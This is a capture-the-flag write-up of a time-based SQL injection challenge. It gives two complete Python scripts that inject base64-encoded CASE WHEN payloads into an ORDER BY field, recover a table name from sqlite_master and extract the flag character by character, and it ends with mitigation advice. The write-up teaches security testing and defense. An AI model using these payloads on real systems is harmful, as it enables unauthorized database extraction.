# Solution for Time-Based SQL Injection

## Challenge Overview

In this challenge, we exploited a time-based SQL injection vulnerability to extract the name of a dynamically generated table and retrieve the secret value stored within it. The challenge demonstrates the importance of secure coding practices and validates the effectiveness of SQL injection as an attack vector when inputs are not properly sanitized.

## Vulnerability Explained

Time-based SQL injection occurs when an attacker can influence the execution time of a database query to infer data. This type of injection is useful when direct data retrieval is not possible, but the applicationâ€™s behavior can be observed based on the time it takes to execute certain queries.

The vulnerability in this challenge allowed attackers to:
1. Identify the name of a table with a specific prefix (`secret_`).
2. Extract the content of a column (in this case, the `text` column containing the secret flag) from the identified table.

The exploitation relied on crafting SQL queries that deliberately caused a delay (using a hypothetical `zhopi()` function) when a specific condition was met. By measuring the response time, the attacker could deduce whether the condition was true or false, thus extracting data character by character.

## Application Walkthrough

The following screenshots showcase the vulnerable application in action:

![homepage](/assets/img/ShunyaCTF/TimeStone/homepage.png)

1. The home page provides information about what a time stone is and what are the key facts about the time stone.
2. After hovering mouse pointer to the GIF image, that gif image is clickable and redirecting us to new directory named `/time`.
3. When I visit the `/time` directory, there are bunch of Marvel movies posters and there ratings. There are no input boxes or other stuffs just a gallary of Marvel movies. As shown in the image below:  
![mainpage](/assets/img/ShunyaCTF/TimeStone/mainpage.png)

1. So I decided to review the source code to check if I can find something and boom there is some Javascript code running that seems suspicious, see the screenshot below:
![sourcecode](/assets/img/ShunyaCTF/TimeStone/sourcecode.png)

2. There are two different api calls are happening first one is `/api/goodforyou` and another one is `/api/movies`.
3. First one is just for diversion we don't need that but the another one has something interesting, Application is sending a POST request to that endpoint with a json data `sequence: 'aWQgZGVzYw=='`.
4. It's a base64 data so let's decode it. `aWQgZGVzYw==` -> `id desc`
5. `id desc` it looks like the SQL/SQLite syntax. Now we understand that this challenge is about the SQL injection and as the name suggests it's a time stone so the SQL injection should be time based. Let's create a script to exploit this vulnerablity.
6. But before that to read the flag we must know the table name where the flag is stored so we create 2 different script one for table name retrival and another for flag retrival. Script are mentioned below.  

## Solution Script Walkthrough

### 1. Finding the Table Name

The first part of the solution involved finding the dynamically generated table name. The `sqlite_master` table was queried to locate tables with names starting with `secret`. By leveraging the `SUBSTR` function, each character of the table name was extracted iteratively.

```python
# Script to find the table name
import requests
import base64
import json
import time

url = '<url for the chall>'

secret = list()
table_name = 'secret'
chars = 'abcdefghijklmnopqrstuvwxyz_'
sleep_time = 1

while True:
    found = False
    for i in chars:
        payload = f"(CASE WHEN (SELECT SUBSTR(name,{len(table_name)+1},1) FROM sqlite_master WHERE type='table' AND name LIKE 'secret%')='{i}' THEN id + zhopi({sleep_time}) ELSE rating END) DESC"

        encoded_payload = base64.b64encode(payload.encode()).decode('utf-8')

        data = {
            'sequence': encoded_payload
        }
        start_time = time.time()
        r = requests.post(
            url + '/api/movies',
            data=json.dumps(data),
            headers={'Content-Type': 'application/json'}
        )
        end_time = time.time()

        elapsed_time = end_time - start_time

        if elapsed_time >= sleep_time:
            table_name += i
            found = True
            print(f"Found character: {i}, updated table name: {table_name}")
            break
        else:
            print(f"\rTrying for: {i} at index: {len(table_name)}, elapsed time: {elapsed_time}", end="")

    if not found:
        print("No matching character found.")
        break

print(f"Final table name: {table_name}")
```

### 2. Extracting the Secret Value

After identifying the table name, the second script was used to extract the secret value. Similar logic was applied, but this time, the `text` column of the identified table was queried.

```python
# Script to find the value from the table
import requests
import base64
import json
import time

url = '<url for the chall>'

flag = ''
chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
sleep_time = 1

while True:
    found = False
    for i in chars:
        payload = f"(CASE WHEN (SELECT SUBSTR(text,{len(flag)+1},1) FROM secret_oezxsbhh_text WHERE id=1)='{i}' THEN id + zhopi({sleep_time}) ELSE rating END) DESC"

        encoded_payload = base64.b64encode(payload.encode()).decode('utf-8')

        data = {
            'sequence': encoded_payload
        }
        start_time = time.time()
        r = requests.post(
            url + '/api/movies',
            data=json.dumps(data),
            headers={'Content-Type': 'application/json'}
        )
        end_time = time.time()

        elapsed_time = end_time - start_time

        if elapsed_time >= sleep_time:
            flag += i
            found = True
            print(f"\nFound character: {i}, updated flag: {flag}")
            break
        else:
            print(f"\rTrying for: {i} at index: {len(flag)}, elapsed time: {elapsed_time}", end="")

    if not found:
        print("\nNo matching character found.")
        break

print(f"\nFinal flag: {flag}")
```

## How to Use the Solution Script

1. Update the `url` variable with the challenge URL.
2. Run the first script to find the table name.
   - Ensure the server is running and accessible.
   - The script will output the discovered table name.
3. Update the second script with the identified table name.
   - Replace `secret_oezxsbhh_text` with the discovered table name.
4. Run the second script to extract the secret value (flag).
   - The script will iteratively reveal the flag character by character.

## Conclusion

This challenge highlighted the importance of mitigating SQL injection vulnerabilities by:
- Validating and sanitizing user inputs.
- Using parameterized queries to prevent attackers from injecting malicious SQL.
- Disabling potentially harmful database functions or queries.

Understanding and exploiting time-based SQL injection requires patience and precision, making it an effective learning exercise for aspiring security professionals.
